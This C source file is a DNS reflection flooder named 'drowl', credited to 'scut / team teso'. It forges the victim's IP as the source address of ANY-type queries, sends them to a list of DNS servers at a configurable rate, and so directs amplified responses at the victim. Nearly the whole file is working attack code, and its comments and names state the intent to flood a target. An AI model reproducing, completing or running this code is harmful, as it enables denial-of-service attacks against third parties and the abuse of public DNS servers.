/* drowl - dns flooder
 *
 * by scut / teso
 * not to be shown to the public
 *
 */

#include <sys/time.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "common.h"
#include "dns.h"
#include "dns-build.h"
#include "network.h"

#define	AUTHORS	"team teso"
#define	VERSION "0.0.1"


void	fl_fuckthem (char *ip_dst, char *file_dns_servers, char *file_domains, long int rate, int pps);
void	fl_rate (struct timeval *start, long int pps, long int pc);
void	fl_send (char *ip_dst_c, char *ip_dns_c, char **domain_list);


struct timeval	fl_start;
long int	pc = 0;


int
main (int argc, char **argv)
{
	long int	rate;
	int		pps;

	printf ("drowl "VERSION" - dns forger by "AUTHORS"\n\n");

	if (argc != 6) {
		printf ("usage: %s <victim-ip> <dns-file> <domain-file> <rate> <pps>\n\n"
			"<victim-ip>   forged source ip of the query packets\n"
			"<dns-file>    file with dns server ip's in it (one per line)\n"
			"<domain-file> file with domain names to query (one per line)\n"
			"<rate>        overall query packets per second\n"
			"<pps>         queries per server (take a value between 10 and 100)\n\n", argv[0]);

		exit (EXIT_FAILURE);
	}

	if (sscanf (argv[4], "%li", &rate) != 1 || sscanf (argv[5], "%d", &pps) != 1)
		exit (EXIT_FAILURE);

	fl_fuckthem (argv[1], argv[2], argv[3], rate, pps);

	exit (EXIT_SUCCESS);
}


/* fl_fuckthem
 *
 * main flood routine.
 * ip_dst = victim ip address
 * file_dns_servers = file with dns server ip's (one ip per line)
 * file_domains = file with domains to query (one domain per line)
 * rate = packets to send per second
 * pps = packet runs per dns server (be careful with this)
 */

void
fl_fuckthem (char *ip_dst, char *file_dns_servers, char *file_domains, long int rate, int pps)
{
	char	**domains,
		**dns_servers;
	int	ds;

	domains = file_read (file_domains);
	dns_servers = file_read (file_dns_servers);
	if (domains == NULL || dns_servers == NULL)
		return;

	gettimeofday (&fl_start, NULL);

	/* cycle through servers and ensure maximum packet flow rate
	 */
	while (pps-- > 0) {
		for (ds = 0 ; dns_servers[ds] != NULL ; ds++) {
			fl_send (ip_dst, dns_servers[ds], domains);
			fl_rate (&fl_start, rate, pc);
		}
	}
}


void
fl_rate (struct timeval *start, long int pps, long int pc)
{
	long int	t_diff;
	long int	tp_frame;	/* time per ip frame */
	struct timeval	tv_cur;

	gettimeofday (&tv_cur, NULL);
	t_diff = ((tv_cur.tv_sec * 1000000) + tv_cur.tv_usec) -
		((start->tv_sec * 1000000) + start->tv_usec);
	tp_frame = (1000000 / pps) - t_diff;

	/* sending too slow or in correct speed
	 */
	if (tp_frame <= 0)
		return;

	/* sending too fast
	 */
	usleep (tp_frame);

	return;
}


void
fl_send (char *ip_dst_c, char *ip_dns_c, char **domain_list)
{
	dns_pdata	*pd;
	int		i, n;

	pd = dns_build_new ();

	/* build query packet out of domain list
	 */
	for (i = 0 ; domain_list[i] != NULL ; i++) {
		dns_build_q (pd, domain_list[i], TY_ANY, CL_IN);
	}

	/* fuck them hard, sapienta sat !
	 */
	n = dns_packet_send (ip_dst_c, ip_dns_c,
		m_random (1025, 65534), 53, m_random (1, 65535),
		0, i, 0, 0, 0, pd, 1);

	pc++;
	dns_build_destroy (pd);
}

